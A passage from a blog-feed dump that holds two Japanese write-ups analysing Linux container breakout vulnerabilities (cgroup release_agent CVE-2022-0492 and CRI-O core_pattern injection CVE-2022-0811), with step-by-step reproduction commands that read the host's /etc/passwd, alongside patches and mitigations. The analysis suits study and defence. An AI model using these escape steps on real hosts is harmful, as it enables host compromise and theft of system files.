を同時に作成することで、コンテナ内でのマウントが可能になります。マウントさえできれば release_agent に書き込むことができます。root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成root@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh --decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つroot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウントroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep \'cgroup (rw\'cgroup on /mnt type cgroup (rw,relatime,rdma)ここまでで、コンテナ内から release_agent に書き込めるようになりました。続いてコンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置します。今回は /etc/passwd をコンテナ内に出力するスクリプトを作成しています。release_agent に設定するのはプログラムのパスですが、ホストから見た絶対パスを指定する必要があります。root@ab988587a245:/# host_path=`sed -n \'s/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p\' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパスroot@ab988587a245:/# echo \\"$host_path/cmd\\" > /mnt/release_agentroot@ab988587a245:/# echo \'#!/bin/sh\' > /cmdroot@ab988587a245:/# echo \\"cat /etc/passwd > $host_path/output\\" >> /cmdroot@ab988587a245:/# chmod a+x /cmd最後に用意したプログラムを起動するため、cgroup 内のプロセスを空にします。root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成root@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 > /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \\"echo \\\\$\\\\$\\" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加root@ab988587a245:/# cat /output   ← コンテナ内にホストの /etc/passwd が出力されているroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...修正パッチhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of->priv;+   if ((ctx->ns->user_ns != &init_user_ns) ||+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of->kn, false);修正後は上記検証手順での release_agent への書き込みはできません。これは書き込みプロセスが CAP_SYS_ADMIN は持ちますが、init user ns でないためだと理解しています。init user ns かつ CAP_SYS_ADMIN を同時に満たすのは、非特権コンテナにおいては不可能となりました。（厳密にはプロセスの capability と、対象 cgroup の所有 user ns のチェックを行なっています）# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test > /mnt/release_agent bash: echo: write error: Operation not permittedただし特権コンテナでは引き続きコンテナブレイクアウトは可能です。SELinux を設定する等の対策は必要です。コンテナセキュリティコンテナセキュリティと本脆弱性の関係について簡単に見ていきます。seccompseccomp はコンテナ内で実行できるシステムコールを制限します。システムコールをブロックするため、ns を作成する段階でエラーとなります。# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ファイル操作、プログラム実行、capabilities 等を制限します。# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes の場合Kubernetes においては、seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響が出る可能性があります。AppArmor/SELinux は Kubernetes ノードやコンテナランタイムで有効にする必要があります。さらに seccomp は Pod のマニフェストにも設定しなければなりません。また securityContext に適切な設定をすることも重要です。allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities 等でコンテナの機能を制限すれば、今後生まれる脆弱性の予防にもなると考えます。EKS, GKE の場合EKS のノードに使われる Amazon Linux 2 では、rdma のようなコンテナ内に root cgroup がマウントされたサブシステムはないようです。このため cgroup を新規にマウントしても release_agent は見えず、本脆弱性を悪用することはできません。# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE のノードに使われる COS では、デフォルトで AppArmor が有効になっているようです。(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission denied以上のことから EKS, GKE では本脆弱性の影響はなさそうです。さいごに本脆弱性の調査を通じて、コンテナを構成する Linux の要素技術やコンテナセキュリティへの理解が深まりました。Linux の技術について包括的に学ぶのは（個人的には）難しいので、このような脆弱性の調査から学ぶアプローチも良いのではと思います。本記事が皆さんの学習の糧になれば幸いです。参考リンクCVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlコンテナセキュリティhttps://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/04/01] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220401","contentSnippet":"普段は#kubenewsの2022年04月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/qNk58ApYjdg 告知とかニュースっぽいもの Kubernetes Meetup Tokyoで登壇しましたhttps:/...","isoDate":"2022-04-01T12:45:40.000Z","dateMiliSeconds":1648817140000,"authorName":"bells17","authorId":"bells17"},{"title":"CVE-2022-0811 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","contentSnippet":"CRI-O の脆弱性 (CVE-2022-0811) について調べた内容をまとめました。脆弱性の詳細と、関連する CRI-O の実装や Linux の機能を紹介します。CVE-2022-0811 概要CRI-O についてCRI-O 概要pinns による pod へのカーネルパラメータ設定Coredumpエクスプロイト要点検証回避策修正パッチcommit1commit2containerd の場合さいごに参考リンクCVE-2022-0811 概要CVE-2022-0811 は CRI-O の任意コード実行・コンテナブレイクアウトの脆弱性で、報告した CrowdStrike 社は「cr8escape」と呼んでいます。CRI-O の v1.19 以降に影響があり、すでに修正バージョンがリリースされています。 (詳細は Security Advisory を参照)カーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能となっていました。これによりプロセスを異常終了させることでホストの root 権限で任意の操作を行えます。CRI-O についてCRI-O 概要https://github.com/cri-o/cri-oCRI-O は Kubernetes に最適化された軽量な高レベルコンテナランタイムです。CLI ツールは crictl (https://github.com/kubernetes-sigs/cri-tools) を使用します。# cat container-config.json {  \\"metadata\\": {      \\"name\\": \\"ubuntu\\"  },  \\"image\\":{      \\"image\\": \\"ubuntu\\"  },  \\"command\\": [      \\"sleep\\",      \\"3600\\"  ],  \\"log_path\\":\\"ubuntu.0.log\\",  \\"linux\\": {  }}# cat pod-config.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"hdishd83fjaiarawuwk28bcsb\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {    }}# crictl runp pod-config.json   ← pod の起動b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   ← コンテナ作成2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   ← コンテナ起動2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns による pod へのカーネルパラメータ設定CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータ (sysctls) を設定できます。first commit)設定には -s オプションを使用し、key=value の形式で複数のカーネルパラメータを連結して渡すことができます。pinns -s kernel_parameter1=value1+kernel_parameter2=value2設定可能な sysctls は以下の実装で制限されています。https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \\"kernel.shm\\": IpcNamespace,  \\"kernel.msg\\": IpcNamespace,  \\"fs.mqueue.\\": IpcNamespace,  \\"net.\\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \\"%q not allowed with host %s enabled\\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace && hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace && hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace && hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\\"%s not whitelisted\\", s.Key())}sysctls の適用は pinns 内に実装されており、-s オプションの設定値をもとに /proc/sys/ 以下のファイルに書き込みを行なっています。https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\\"sysctl key or value not initialized\\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == \'.\')      *it = \'/\';  _cleanup_close_ int dirfd = open (\\"/proc/sys\\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd < 0))  {    pwarn (\\"failed to open /proc/sys\\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd < 0))  {    pwarnf (\\"failed to open /proc/sys/%s\\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret < 0))  {    pwarnf (\\"failed to write to /proc/sys/%s\\", sysctl_key);    return -1;  }  return 0;}Coredumpプロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力します。Coredump の設定は /proc/sys/kernel/core_pattern に書かれており、ファイルの直接編集や sysctl コマンドで設定を変更できます。# sysctl -w kernel.core_pattern=\\"%e-%s.core\\"kernel.core_pattern には dump の出力先パスを指定しますが、最初文字がパイプ | の場合は指定パスのプログラムを実行します (この場合 dump は標準入力として渡される)。/proc/sys/kernel/core_pattern のデフォルト値として、ubuntu (20.04) では apport というバグレポートツールが指定されています。$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eまた Coredump のファイルサイズ上限は ulimit で設定します。脆弱性は Soft Limit が0でも刺さりそうです。# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usエクスプロイト要点kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照するコンテナ内からは変更不可pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できるCIO-O 内で sysctl のキーを検証しているが、value に + を含む文字列を渡すことでバイパス可能 (以下コードを参照)設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行問題となったコードfunc getSysctlForPinns(sysctls map[string]string) string {  // this assumes there\'s no sysctl with a `+` in it  const pinnsSysctlDelim = \\"+\\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)  // ← \\"\'key1=value1\'+\'key2=value2\'\\" の形で文字列連結する  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}検証脆弱なバージョンの CRI-O で CVE-2022-0811 を検証します。Kubernetes は使用せず、crictl での検証を行いました。# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  true最初にホストに実行させたいプログラムを配置するコンテナを作成します。json、pod-config.json は前述のファイルと同じものです。# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123起動したコンテナにアタッチし、コンテナの root パスにプログラムを配置します。/etc/passwd をコンテナ内の /output に出力するスクリプトを用意しました。# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo \'#!/bin/sh\' > /cmdroot@d33614f0b22d:/# echo \'cat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output\' >> cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmd続いて kernel.core_pattern を変更する pod を作成します。+ で連結した value を記載します。value に記載する kernel.core_pattern には、ホストから見たプログラムの絶対パスを指定しています。# をつけていますが、これは CRI-O の実装で付与されるシングルクォートを無効化する役割があります。# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox2\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"edishd83djaidwnduwk28bcsd\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {  \\"sysctls\\": {      \\"kernel.shm_rmid_forced\\": \\"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod 作成はエラーになりますが、kernel.core_pattern を見ると変更されていることがわかります。# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\'最後に起動中のコンテナ内でプロセスを異常終了させることで、 Coredump の機能を呼び出しホストの root 権限でプログラムを実行させることができます。root@d33614f0b22d:/# tail -f /dev/null &[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...回避策CrowdStrike 社のブログ を参考にしています。CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)OPA 等のポリシーを設定するPSP で sysctls を全てブロックするpinns の -s を除去するラッパーを用意し、crio.conf の pinns_path に設定する修正パッチcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns の -s オプションを生成する箇所で、+ に対してバリデーションを追加しています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \\"-s\\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \\"invalid sysctl\\")+     }+     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there\'s no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there\'s no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \\"+\\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \\"\\", errors.Errorf(\\"\'%s=%s\' is invalid: %s found yet should not be present\\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2文字列の連結をやめ、-s をパラメータ毎に設定する修正がされています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \\"invalid sysctl\\")-     }-     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \\"-s\\", fmt.Sprintf(\\"%s=%s\\", key, value))    }      ...  }containerd の場合他のコンテナランタイムがどうなっているか気になったので、containerd の実装を調べてみました。https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn\'t completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \\"kernel.msgmax\\":          true,        \\"kernel.msgmnb\\":          true,        \\"kernel.msgmni\\":          true,        \\"kernel.sem\\":             true,        \\"kernel.shmall\\":          true,        \\"kernel.shmmax\\":          true,        \\"kernel.shmmni\\":          true,        \\"kernel.shm_rmid_forced\\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \\"fs.mqueue.\\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts ipc namespace\\", s)            }        }        if strings.HasPrefix(s, \\"net.\\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts network namespace\\", s)            }        }        return fmt.Errorf(\\"sysctl %q is not in a separate kernel namespace\\", s)    }    return nil}CRI-O は pinns により独自の sysctls 設定を実装していますが、pod 作成時に設定する都合上、 OCI の機能を使わない方法を選んだのかもしれません (根拠はないです)。さいごに初めて CRI-O を触りましたが、Docker や containerd とはかなり仕組みが異なることがわかりました。脆弱性の調査を通して CRI-O の実装や Linux の機能に触れることができ、良い機会を得られたと思います。内容に誤りが含まれる可能性がありますので、何かお気づきの方はご指摘等よろしくお願いします。参考リンクhttps://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"nnn(Terminal file manager)を使ってみる","link":"https://zenn.dev/tayusa/articles/1f87e798ccbed0","contentSnippet":"nnnとはhttps://github.com/jarun/nnnターミナル上で動作するファイルマネージャー 良い点軽量で高速な動作を保つために機能をプラグインとして外出しして拡張できる設計になってますプラグインはシェルスクリプトなどで簡単に記述できますキーバインドはviライクですtmuxを利用してる状態の画像表示も問題ないですターミナルはkittyを利用しています インストールUbuntu$ sudo apt install nnnArch Linux$ sudo pacman -S nnnMacOS$ bre...","isoDate":"2022-03-27T13:27:45.000Z","dateMiliSeconds":1648387665000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[2022/03/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220325","contentSnippet":"普段は#kubenewsの2022年03月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/NewvQB5q-QU 告知とかニュースっぽいもの Cloud Native Database Meetup #4https:...","isoDate":"2022-03-25T12:55:35.000Z","dateMiliSeconds":1648212935000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/03/18] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220318","contentSnippet":"普段は#kubenewsの2022年03月18日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/y7DMp3aqCFM 告知とかニュースっぽいもの 3-shake SRE Tech Talk #3https://youtu...","isoDate":"2022-03-18T12:50:45.000Z","dateMiliSeconds":1647607845000,"authorName":"bells17","authorId":"bells17"},{"title":"脆弱性に学ぶコンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/cui-ruo-xing-nixue-bukontenasekiyuritei","contentSnippet":"3-shake SRE Tech Talk #3 の登壇資料です。\\rhttps://3-shake.connpass.com/event/241284/","isoDate":"2022-03-18T04:00:00.000Z","dateMiliSeconds":1647576000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Pandocカスタムライター入門1: 基本は文字列処理","link":"https://blog.atusy.net/2022/03/14/pandoc-custom-writer/","contentSnippet":"Pandocは様々な文書ファイルを相互変換できるソフトウェアです。“A unitversal document converter”を名乗るだけのことはあり、HTML, LaTeX, Docx, Markdownなどの様々なファイル形式に対応します。更には対応するファイル形式の追加に対応します。入力の場合はカスタムリーダー、出力の場合はカスタムライターと呼ばれ、共にLua言語で定義できます。","isoDate":"2022-03-14T00:00:00.000Z","dateMiliSeconds":1647216000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Observability Conference 2022 